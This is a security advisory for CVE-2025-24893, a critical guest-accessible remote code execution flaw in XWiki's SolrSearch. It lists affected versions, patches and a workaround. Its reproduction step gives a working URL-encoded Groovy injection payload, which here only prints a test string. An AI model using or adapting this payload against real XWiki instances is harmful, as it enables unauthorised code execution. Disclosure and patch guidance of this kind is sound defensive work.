# XWiki Platform allows remote code execution as guest via SolrSearchMacros request

**GHSA**: GHSA-rr6p-3pfg-562j | **CVE**: CVE-2025-24893 | **Severity**: critical (CVSS 9.8)

**CWE**: CWE-94, CWE-95

**Affected Packages**:
- **org.xwiki.platform:xwiki-platform-search-solr-ui** (maven): >= 5.3-milestone-2, < 15.10.11
- **org.xwiki.platform:xwiki-platform-search-solr-ui** (maven): >= 16.0.0-rc-1, < 16.4.1

## Description

### Impact
Any guest can perform arbitrary remote code execution through a request to `SolrSearch`. This impacts the confidentiality, integrity and availability of the whole XWiki installation.

To reproduce on an instance, without being logged in, go to `<host>/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28"Hello%20from"%20%2B%20"%20search%20text%3A"%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20`. If there is an output, and the title of the RSS feed contains `Hello from search text:42`, then the instance is vulnerable.

### Patches
This vulnerability has been patched in XWiki 15.10.11, 16.4.1 and 16.5.0RC1.

### Workarounds
[This line](https://github.com/xwiki/xwiki-platform/blob/568447cad5172d97d6bbcfda9f6183689c2cf086/xwiki-platform-core/xwiki-platform-search/xwiki-platform-search-solr/xwiki-platform-search-solr-ui/src/main/resources/Main/SolrSearchMacros.xml#L955) in `Main.SolrSearchMacros` can be edited to match the `rawResponse` macro defined [here](https://github.com/xwiki/xwiki-platform/blob/67021db9b8ed26c2236a653269302a86bf01ef40/xwiki-platform-core/xwiki-platform-web/xwiki-platform-web-templates/src/main/resources/templates/macros.vm#L2824) with a content type of `application/xml`, instead of simply outputting the content of the feed.

### References

* https://jira.xwiki.org/browse/XWIKI-22149
* https://github.com/xwiki/xwiki-platform/commit/67021db9b8ed26c2236a653269302a86bf01ef40

### Attribution
This vulnerability has been reported by John Kwak for Trend Micro's Zero Day Initiative.
